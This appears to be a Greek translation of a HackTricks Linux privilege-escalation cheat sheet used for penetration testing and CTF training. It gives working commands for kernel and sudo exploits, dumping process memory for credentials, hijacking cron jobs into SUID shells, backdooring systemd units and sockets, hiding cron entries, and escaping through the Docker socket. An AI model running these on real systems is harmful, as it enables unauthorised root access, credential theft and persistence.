# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Πληροφορίες Συστήματος

### Πληροφορίες OS

Ας αρχίσουμε να συλλέγουμε πληροφορίες για το λειτουργικό σύστημα που τρέχει
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στη μεταβλητή `PATH`, μπορεί να καταφέρετε να καταλάβετε κάποιες βιβλιοθήκες ή δυαδικά αρχεία:
```bash
echo $PATH
```
### Πληροφορίες Env

Υπάρχουν ενδιαφέρουσες πληροφορίες, passwords ή API keys στα environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Ελέγξτε την kernel version και αν υπάρχει κάποιο exploit που μπορεί να χρησιμοποιηθεί για να escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Μπορείτε να βρείτε μια καλή λίστα με ευάλωτα kernel και μερικά ήδη **compiled exploits** εδώ: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) και [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Άλλοι ιστότοποι όπου μπορείτε να βρείτε μερικά **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Για να εξαγάγετε όλες τις ευάλωτες εκδόσεις kernel από αυτή τη σελίδα μπορείτε να κάνετε:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Εργαλεία που μπορούν να βοηθήσουν στην αναζήτηση kernel exploits είναι:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (εκτέλεση IN victim, ελέγχει μόνο exploits για kernel 2.x)

Πάντα **αναζήτησε την έκδοση του kernel στο Google**, ίσως η έκδοση του kernel σου να αναφέρεται σε κάποιο kernel exploit και τότε θα είσαι σίγουρος ότι αυτό το exploit είναι έγκυρο.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo έκδοση

Βασισμένο στις ευάλωτες εκδόσεις του sudo που εμφανίζονται στο:
```bash
searchsploit sudo
```
Μπορείτε να ελέγξετε αν η έκδοση του sudo είναι ευάλωτη χρησιμοποιώντας αυτό το grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Από @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: απέτυχε η επαλήθευση υπογραφής

Δείτε **smasher2 box of HTB** για ένα **παράδειγμα** του πώς θα μπορούσε να εκμεταλλευτεί αυτή η vuln
```bash
dmesg 2>/dev/null | grep "signature"
```
### Περισσότερη καταγραφή συστήματος
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Καταγραφή πιθανών αμυνών

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Αν βρίσκεστε μέσα σε ένα docker container, μπορείτε να προσπαθήσετε να διαφύγετε από αυτό:


{{#ref}}
docker-security/
{{#endref}}

## Δίσκοι

Ελέγξτε **τι είναι mounted και unmounted**, πού και γιατί. Αν κάτι είναι unmounted, μπορείτε να προσπαθήσετε να το mount και να ελέγξετε για ιδιωτικές πληροφορίες
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Χρήσιμο λογισμικό

Καταγράψτε χρήσιμα binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Επίσης, ελέγξτε αν έχει εγκατασταθεί **οποιοσδήποτε μεταγλωττιστής**. Αυτό είναι χρήσιμο εάν χρειαστεί να χρησιμοποιήσετε κάποιο kernel exploit, καθώς συνιστάται να το μεταγλωττίσετε στο μηχάνημα όπου πρόκειται να το χρησιμοποιήσετε (ή σε ένα παρόμοιο).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Εγκατεστημένο Ευπαθές Λογισμικό

Ελέγξτε για την **έκδοση των εγκατεστημένων πακέτων και υπηρεσιών**. Ίσως υπάρχει κάποια παλιά έκδοση του Nagios (για παράδειγμα) που θα μπορούσε να εκμεταλλευθεί για escalating privileges…\
Συνιστάται να ελέγξετε χειροκίνητα την έκδοση του πιο ύποπτου εγκατεστημένου λογισμικού.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Αν έχετε πρόσβαση SSH στη μηχανή, μπορείτε επίσης να χρησιμοποιήσετε **openVAS** για να ελέγξετε αν υπάρχει παρωχημένο ή ευάλωτο λογισμικό εγκατεστημένο σε αυτή.

> [!NOTE] > _Σημειώστε ότι αυτές οι εντολές θα εμφανίσουν πολλές πληροφορίες που κατά κύριο λόγο θα είναι άχρηστες, επομένως συνιστάται η χρήση κάποιων εφαρμογών όπως το OpenVAS ή παρόμοιων που θα ελέγξουν αν κάποια εγκατεστημένη έκδοση λογισμικού είναι ευάλωτη σε γνωστά exploits_

## Διεργασίες

Κοιτάξτε **ποιες διεργασίες** εκτελούνται και ελέγξτε αν κάποια διεργασία έχει **περισσότερα δικαιώματα απ' ό,τι θα έπρεπε** (ίσως ένα tomcat να εκτελείται από τον root?)
```bash
ps aux
ps -ef
top -n 1
```
Πάντα ελέγχετε για πιθανούς [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** εντοπίζει αυτούς ελέγχοντας την παράμετρο `--inspect` μέσα στη γραμμή εντολών της διεργασίας.\
Επίσης **check your privileges over the processes binaries**, ίσως μπορείτε να overwrite κάποιο binary.

### Process monitoring

Μπορείτε να χρησιμοποιήσετε εργαλεία όπως [**pspy**](https://github.com/DominicBreuker/pspy) για να παρακολουθείτε processes. Αυτό μπορεί να είναι πολύ χρήσιμο για να εντοπίσετε ευάλωτες processes που εκτελούνται συχνά ή όταν πληρούνται ορισμένες προϋποθέσεις.

### Process memory

Κάποιες υπηρεσίες ενός server αποθηκεύουν **credentials in clear text inside the memory**.\
Κανονικά θα χρειαστείτε **root privileges** για να διαβάσετε τη μνήμη διεργασιών που ανήκουν σε άλλους χρήστες, επομένως αυτό συνήθως είναι πιο χρήσιμο όταν είστε ήδη root και θέλετε να ανακαλύψετε περισσότερα credentials.\
Ωστόσο, θυμηθείτε ότι **ως απλός χρήστης μπορείτε να διαβάσετε τη μνήμη των processes που σας ανήκουν**.

> [!WARNING]
> Σημειώστε ότι σήμερα οι περισσότερες μηχανές **δεν επιτρέπουν ptrace από προεπιλογή**, που σημαίνει ότι δεν μπορείτε να dump άλλες processes που ανήκουν στον μη εξουσιοδοτημένο χρήστη σας.
>
> Το αρχείο _**/proc/sys/kernel/yama/ptrace_scope**_ ελέγχει την προσβασιμότητα του ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: όλες οι processes μπορούν να debugαριστούν, αρκεί να έχουν το ίδιο uid. Αυτή ήταν η κλασική συμπεριφορά του ptracing.
> - **kernel.yama.ptrace_scope = 1**: μόνο μια parent process μπορεί να debugαριστεί.
> - **kernel.yama.ptrace_scope = 2**: Μόνο admin μπορεί να χρησιμοποιήσει ptrace, καθώς απαιτείται η capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Καμία process δεν μπορεί να παρακολουθηθεί με ptrace. Μόλις οριστεί, απαιτείται reboot για να ενεργοποιηθεί ξανά το ptracing.

#### GDB

Αν έχετε πρόσβαση στη μνήμη μιας υπηρεσίας FTP (για παράδειγμα), μπορείτε να πάρετε το Heap και να ψάξετε μέσα για τα credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Σενάριο GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Για ένα δεδομένο process ID, **maps δείχνουν πώς η μνήμη αντιστοιχίζεται στον εικονικό χώρο διευθύνσεων της διεργασίας**· δείχνουν επίσης τα **permissions κάθε αντιστοιχισμένης περιοχής**. Το ψευδο-αρχείο **mem** **αποκαλύπτει την ίδια τη μνήμη της διεργασίας**. Από το αρχείο **maps** γνωρίζουμε ποιες **περιοχές μνήμης είναι αναγνώσιμες** και τα offsets τους. Χρησιμοποιούμε αυτές τις πληροφορίες για να **seek στο αρχείο mem και να dump όλες τις αναγνώσιμες περιοχές** σε ένα αρχείο.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` παρέχει πρόσβαση στη **φυσική** μνήμη του συστήματος, όχι στην εικονική μνήμη. Ο εικονικός χώρος διευθύνσεων του πυρήνα μπορεί να προσεγγιστεί χρησιμοποιώντας /dev/kmem.\
Συνήθως, `/dev/mem` διαβάζεται μόνο από τον **root** και την ομάδα kmem.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump για linux

Το ProcDump είναι μια επανασχεδίαση για Linux του κλασικού εργαλείου ProcDump από τη σουίτα εργαλείων Sysinternals για Windows. Βρείτε το στο [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Εργαλεία

Για να κάνετε dump της process memory μπορείτε να χρησιμοποιήσετε:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Μπορείτε χειροκίνητα να αφαιρέσετε τις απαιτήσεις root και να κάνετε dump την process που ανήκει σε εσάς
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (απαιτείται root)

### Διαπιστευτήρια από process memory

#### Χειροκίνητο παράδειγμα

Αν βρείτε ότι η authenticator process τρέχει:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Μπορείτε να dump the process (δείτε τις προηγούμενες ενότητες για να βρείτε διαφορετικούς τρόπους να dump the memory ενός process) και να ψάξετε για credentials μέσα στη memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Το εργαλείο [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) θα **αποσπάσει διαπιστευτήρια σε απλό κείμενο από τη μνήμη** και από κάποια **γνωστά αρχεία**. Απαιτεί δικαιώματα root για να λειτουργήσει σωστά.

| Χαρακτηριστικό                                   | Όνομα διεργασίας     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Ενεργές FTP Συνδέσεις)                    | vsftpd               |
| Apache2 (Ενεργές HTTP Basic Auth συνεδρίες)       | apache2              |
| OpenSSH (Ενεργές SSH συνεδρίες - χρήση Sudo)      | sshd:                |

#### Αναζήτηση Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Προγραμματισμένα/Cron jobs

Ελέγξτε αν κάποια προγραμματισμένη εργασία είναι ευάλωτη. Ίσως μπορείτε να εκμεταλλευτείτε ένα script που εκτελείται από root (wildcard vuln; μπορείτε να τροποποιήσετε αρχεία που χρησιμοποιεί ο root; να χρησιμοποιήσετε symlinks; να δημιουργήσετε συγκεκριμένα αρχεία στον directory που χρησιμοποιεί ο root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Διαδρομή Cron

Για παράδειγμα, μέσα στο _/etc/crontab_ μπορείτε να βρείτε το PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Σημειώστε ότι ο χρήστης "user" έχει δικαιώματα εγγραφής στο /home/user_)

Αν μέσα σε αυτό το crontab ο χρήστης root προσπαθεί να εκτελέσει κάποια εντολή ή script χωρίς να ορίσει το PATH. Για παράδειγμα: _\* \* \* \* root overwrite.sh_\
Τότε, μπορείτε να αποκτήσετε ένα root shell χρησιμοποιώντας:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron που χρησιμοποιεί ένα script με wildcard (Wildcard Injection)

Αν ένα script που εκτελείται από root έχει “**\***” μέσα σε μια εντολή, μπορείς να το εκμεταλλευτείς για να προκαλέσεις απροσδόκητα πράγματα (όπως privesc). Παράδειγμα:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Εάν το wildcard προηγείται ενός μονοπατιού όπως** _**/some/path/\***_ **, δεν είναι ευάλωτο (ακόμη και** _**./\***_ **δεν είναι).**

Διάβασε την παρακάτω σελίδα για περισσότερα κόλπα εκμετάλλευσης wildcard:

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Υπεργραφή Cron script και symlink

Αν **μπορείς να τροποποιήσεις ένα cron script** που εκτελείται από root, μπορείς να αποκτήσεις πολύ εύκολα ένα shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Αν το script που εκτελείται από τον root χρησιμοποιεί έναν **φάκελο όπου έχετε πλήρη πρόσβαση**, ίσως να είναι χρήσιμο να διαγράψετε αυτόν τον φάκελο και να **δημιουργήσετε ένα symlink προς κάποιον άλλο φάκελο** που θα εξυπηρετεί ένα script υπό τον έλεγχό σας.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Συχνές εργασίες cron

Μπορείτε να παρακολουθήσετε τις διεργασίες για να εντοπίσετε εκείνες που εκτελούνται κάθε 1, 2 ή 5 λεπτά. Ίσως μπορείτε να το εκμεταλλευτείτε και να escalate privileges.

Για παράδειγμα, για να **παρακολουθήσετε κάθε 0.1s για 1 λεπτό**, **ταξινομήσετε κατά τις λιγότερο εκτελεσμένες εντολές** και **διαγράψετε τις εντολές που έχουν εκτελεστεί περισσότερο**, μπορείτε να κάνετε:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Μπορείτε επίσης να χρησιμοποιήσετε** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (αυτό θα παρακολουθεί και θα καταγράφει κάθε process που ξεκινά).

### Αόρατα cron jobs

Είναι δυνατό να δημιουργήσετε ένα cronjob **τοποθετώντας ένα carriage return μετά από ένα σχόλιο** (χωρίς χαρακτήρα newline), και το cron job θα λειτουργήσει. Παράδειγμα (προσέξτε τον χαρακτήρα carriage return):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Υπηρεσίες

### Αρχεία _.service_ με δικαίωμα εγγραφής

Ελέγξτε αν μπορείτε να γράψετε οποιοδήποτε αρχείο `.service`. Αν μπορείτε, **μπορείτε να το τροποποιήσετε** ώστε να **εκτελεί** το **backdoor σας όταν** η υπηρεσία **εκκινείται**, **επαναεκκινείται** ή **τερματίζεται** (ίσως χρειαστεί να περιμένετε μέχρι να γίνει επανεκκίνηση του μηχανήματος).\
Για παράδειγμα δημιουργήστε το backdoor σας μέσα στο .service αρχείο με **`ExecStart=/tmp/script.sh`**

### Εκτελέσιμα binaries υπηρεσίας με δικαίωμα εγγραφής

Να έχετε υπόψη ότι αν έχετε **δικαιώματα εγγραφής σε binaries που εκτελούνται από υπηρεσίες**, μπορείτε να τα αλλάξετε για backdoors έτσι ώστε όταν οι υπηρεσίες ξαναεκτελεστούν τα backdoors να εκτελούνται.

### systemd PATH - Σχετικές διαδρομές

Μπορείτε να δείτε το PATH που χρησιμοποιεί **systemd** με:
```bash
systemctl show-environment
```
Αν βρεις ότι μπορείς να **γράψεις** σε οποιονδήποτε από τους φακέλους της διαδρομής, ίσως να μπορέσεις να **escalate privileges**. Πρέπει να αναζητήσεις **σχετικές διαδρομές που χρησιμοποιούνται σε αρχεία διαμόρφωσης υπηρεσιών** όπως:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Έπειτα, δημιούργησε ένα **εκτελέσιμο** με το **ίδιο όνομα με το binary της σχετικής διαδρομής** μέσα στον systemd PATH φάκελο που μπορείς να γράψεις, και όταν η υπηρεσία κληθεί να εκτελέσει την ευπαθή ενέργεια (**Start**, **Stop**, **Reload**), το **backdoor θα εκτελεστεί** (συνήθως χρήστες χωρίς προνόμια δεν μπορούν να start/stop υπηρεσίες αλλά έλεγξε αν μπορείς να χρησιμοποιήσεις `sudo -l`).

**Μάθε περισσότερα για τις υπηρεσίες με `man systemd.service`.**

## **Timers**

**Timers** είναι αρχεία unit του systemd των οποίων το όνομα τελειώνει σε `**.timer**` και που ελέγχουν `**.service**` αρχεία ή γεγονότα. Τα **Timers** μπορούν να χρησιμοποιηθούν ως εναλλακτική του cron καθώς έχουν ενσωματωμένη υποστήριξη για calendar time events και monotonic time events και μπορούν να τρέξουν ασύγχρονα.

Μπορείς να απαριθμήσεις όλους τους timers με:
```bash
systemctl list-timers --all
```
### Εγγράψιμοι χρονοδιακόπτες

Εάν μπορείτε να τροποποιήσετε έναν χρονοδιακόπτη, μπορείτε να τον κάνετε να εκτελέσει κάποια υπάρχοντα του systemd.unit (όπως ένα `.service` ή ένα `.target`).
```bash
Unit=backdoor.service
```
Στην τεκμηρίωση μπορείτε να διαβάσετε τι είναι το Unit:

> Η μονάδα που θα ενεργοποιηθεί όταν λήξει αυτός ο timer. Το όρισμα είναι ένα unit name, του οποίου το suffix δεν είναι ".timer". Εάν δεν καθοριστεί, αυτή η τιμή προεπιλέγεται σε μια service που έχει το ίδιο όνομα με την timer unit, εκτός από το suffix. (Δείτε παραπάνω.) Συνιστάται το unit name που ενεργοποιείται και το unit name της timer unit να ονομάζονται ταυτόσημα, εκτός από το suffix.

Επομένως, για να καταχραστείτε αυτή την άδεια θα χρειαστεί να:

- Βρείτε κάποια systemd unit (όπως `.service`) που είναι **εκτελώντας ένα εγγράψιμο binary**
- Βρείτε κάποια systemd unit που είναι **εκτελώντας μια relative path** και έχετε **δικαιώματα εγγραφής** πάνω στο **systemd PATH** (για να παρωμοιώσετε το εκτελέσιμο)

**Μάθετε περισσότερα για τους timers με `man systemd.timer`.**

### **Ενεργοποίηση Timer**

Για να ενεργοποιήσετε έναν timer χρειάζεστε δικαιώματα root και να εκτελέσετε:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Σημειώστε ότι ο/η **timer** **ενεργοποιείται** δημιουργώντας ένα symlink προς αυτό στο `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Τα Unix Domain Sockets (UDS) επιτρέπουν την **επικοινωνία διεργασιών** σε μηχανές στον ίδιο ή σε διαφορετικό host μέσα σε μοντέλα client-server. Χρησιμοποιούν τα τυπικά Unix descriptor αρχεία για επικοινωνία μεταξύ μηχανών και ρυθμίζονται μέσω αρχείων `.socket`.

Τα sockets μπορούν να ρυθμιστούν χρησιμοποιώντας αρχεία `.socket`.

**Μάθετε περισσότερα για τα sockets με `man systemd.socket`.** Μέσα σε αυτό το αρχείο, μπορούν να ρυθμιστούν διάφοροι ενδιαφέροντες παράμετροι:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Αυτές οι επιλογές διαφέρουν αλλά συνοπτικά χρησιμοποιούνται για να **υποδείξουν πού θα ακούει** το socket (η διαδρομή του αρχείου AF_UNIX socket, η διεύθυνση IPv4/6 και/ή ο αριθμός θύρας που θα ακούει, κ.λπ.)
- `Accept`: Παίρνει ένα boolean όρισμα. Εάν είναι **true**, μια **εγκατάσταση service δημιουργείται για κάθε εισερχόμενη σύνδεση** και μόνο το connection socket περνάει σε αυτήν. Εάν είναι **false**, όλα τα listening sockets **περνάνε στην ξεκινώμενη service unit**, και δημιουργείται μόνο μία service unit για όλες τις συνδέσεις. Αυτή η τιμή αγνοείται για datagram sockets και FIFOs όπου μία single service unit χειρίζεται απροϋπόθετα όλη την εισερχόμενη κίνηση. **Προεπιλογή είναι false**. Για λόγους απόδοσης, συνιστάται οι νέοι daemons να γράφονται με τρόπο που να είναι κατάλληλος για `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Παίρνουν μία ή περισσότερες γραμμές εντολών, οι οποίες **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **δημιουργηθούν** και δεσμευτούν, αντίστοιχα. Το πρώτο token της γραμμής εντολής πρέπει να είναι ένα απόλυτο όνομα αρχείου, ακολουθούμενο από τα επιχειρήματα για τη διεργασία.
- `ExecStopPre`, `ExecStopPost`: Πρόσθετες **εντολές** που **εκτελούνται πριν** ή **μετά** τα listening **sockets**/FIFOs **κλείσουν** και αφαιρεθούν, αντίστοιχα.
- `Service`: Καθορίζει το όνομα της **service** unit που θα **ενεργοποιηθεί** σε **εισερχόμενη κίνηση**. Αυτή η ρύθμιση επιτρέπεται μόνο για sockets με Accept=no. Προεπιλέγεται στην service που έχει το ίδιο όνομα με το socket (με αντικατεστημένη την κατάληξη). Στις περισσότερες περιπτώσεις, δεν θα πρέπει να είναι απαραίτητο να χρησιμοποιηθεί αυτή η επιλογή.

### Writable .socket files

Εάν βρείτε ένα **writable** αρχείο `.socket` μπορείτε να **προσθέσετε** στην αρχή της ενότητας `[Socket]` κάτι σαν: `ExecStartPre=/home/kali/sys/backdoor` και το backdoor θα εκτελεστεί πριν δημιουργηθεί το socket. Επομένως, **πιθανότατα θα χρειαστεί να περιμένετε μέχρι να γίνει reboot το μηχάνημα.**\
_Σημειώστε ότι το σύστημα πρέπει να χρησιμοποιεί αυτή τη διαμόρφωση αρχείου socket αλλιώς το backdoor δεν θα εκτελεστεί_

### Writable sockets

Αν **εντοπίσετε οποιοδήποτε writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), τότε **μπορείτε να επικοινωνήσετε** με εκείνο το socket και ίσως να εκμεταλλευτείτε μια ευπάθεια.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ακατέργαστη σύνδεση
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Παράδειγμα εκμετάλλευσης:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Σημειώστε ότι ενδέχεται να υπάρχουν μερικά **sockets listening for HTTP** requests (_δεν αναφέρομαι στα .socket αρχεία αλλά στα αρχεία που λειτουργούν ως unix sockets_). Μπορείτε να το ελέγξετε με:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Αν το socket **απαντήσει σε ένα HTTP request**, τότε μπορείτε να **επικοινωνήσετε** με αυτό και ίσως να **εκμεταλλευτείτε κάποια ευπάθεια**.

### Εγγράψιμο Docker Socket

Το Docker socket, που συχνά βρίσκεται στο `/var/run/docker.sock`, είναι ένα κρίσιμο αρχείο που πρέπει να ασφαλιστεί. Από προεπιλογή, είναι εγγράψιμο από τον χρήστη `root` και τα μέλη της ομάδας `docker`. Η κατοχή write access σε αυτό το socket μπορεί να οδηγήσει σε privilege escalation. Ακολουθεί ανάλυση του πώς αυτό μπορεί να γίνει και εναλλακτικές μέθοδοι αν το Docker CLI δεν είναι διαθέσιμο.

#### **Privilege Escalation with Docker CLI**

Αν έχετε write access στο Docker socket, μπορείτε να escalate privileges χρησιμοποιώντας τις παρακάτω εντολές:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Αυτές οι εντολές σας επιτρέπουν να τρέξετε ένα container με πρόσβαση επιπέδου root στο file system του host.

#### **Using Docker API Directly**

Σε περιπτώσεις όπου το Docker CLI δεν είναι διαθέσιμο, το docker socket μπορεί ακόμα να χειριστεί χρησιμοποιώντας το Docker API και εντολές `curl`.

1.  **List Docker Images:** Ανάκτηση της λίστας με τις διαθέσιμες images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Στείλτε ένα αίτημα για να δημιουργήσετε ένα container που προσαρτά τον κατάλογο root του host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

